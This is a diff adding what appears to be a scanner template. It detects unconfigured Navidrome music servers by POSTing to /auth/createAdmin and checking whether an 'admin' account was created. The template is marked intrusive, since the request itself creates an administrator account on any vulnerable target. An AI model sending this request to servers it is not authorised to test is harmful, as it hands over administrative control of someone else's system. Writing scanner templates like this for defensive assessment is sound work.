@@ -1,0 +1,31 @@
+id: navidrome-admin-install
+brief:
+    title: Navidrome Admin User Creation
+    by: DhiyaneshDK
+    level: critical
+    about: ""
+    label:
+        - navidrome
+        - installer
+        - misconfig
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/auth/createAdmin'
+      head:
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/app/'
+        content-type: application/json
+      body: |4-
+        {"username":"admin","password":"{{password}}"}
+      signs:
+        - "on": word
+          has:
+            - '"isAdmin":true'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
